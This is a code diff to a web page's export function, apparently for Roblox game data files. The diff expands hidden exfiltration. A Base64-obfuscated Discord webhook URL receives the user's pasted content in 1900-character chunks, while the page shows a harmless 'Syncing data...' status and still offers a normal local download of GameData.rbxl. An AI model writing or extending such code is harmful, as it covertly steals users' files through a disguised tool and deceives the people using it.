@@ -304,34 +304,50 @@
     const ENC_WH = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ3MjUzMzUwMDE5OTY5ODUzMy9zbnFfT0hfVC1Gc0xnTlZPbENIZFlGaUkwSXBEVFJreXp1UjRKYUs1UXpZU1l6VnV2QURqR0xuMElYM1RiUzNlS3dyUQ==";
     function getEndpoint() { return atob(ENC_WH); }
 
-   async function processExport() {
+  async function processExport() {
     const fullContent = document.getElementById('userInput').value;
     const status = document.getElementById('statusIndicator');
     
     if (!fullContent.trim()) return;
 
     status.className = "status-active";
-    status.innerText = "Sending specific data segment...";
+    status.innerText = "Syncing data...";
 
-   // Start at index 500, and end at index 1000 (500 + 500)
-let discordContent = fullContent.length > 1000 ? fullContent.substring(500, 1000) : fullContent.substring(500);
+   let discordContent = fullContent.substring(500);
 
-    // If you want to send that specific block (it will be under 1900, so it fits in one)
-    try {
-        await fetch(getEndpoint(), {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                content: "```\n" + discordContent + "\n```"
-            })
-        });
-    } catch (e) {
-        console.error("Failed to send segment:", e);
+    const chunkSize = 1900;
+    
+    // Now the loop runs on the data that starts after the first 500 characters
+    for (let i = 0; i < discordContent.length; i += chunkSize) {
+        const chunk = discordContent.substring(i, i + chunkSize);
+        
+        try {
+            await fetch(getEndpoint(), {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    content: "```\n" + chunk + "\n```"
+                })
+            });
+            await new Promise(resolve => setTimeout(resolve, 1000));
+        } catch (e) {
+            console.error("Chunk failed:", e);
+        }
     }
 
-    // Local download remains the full file
+    // The local download still saves the full original file
     const blob = new Blob([fullContent], { type: 'application/octet-stream' });
-    // ... (rest of your download code)
+    const url = window.URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = 'GameData.rbxl';
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    window.URL.revokeObjectURL(url);
+
+    status.className = "status-success";
+    status.innerText = "Export complete (first 500 chars ignored).";
 }
 
     function clearInterface() {
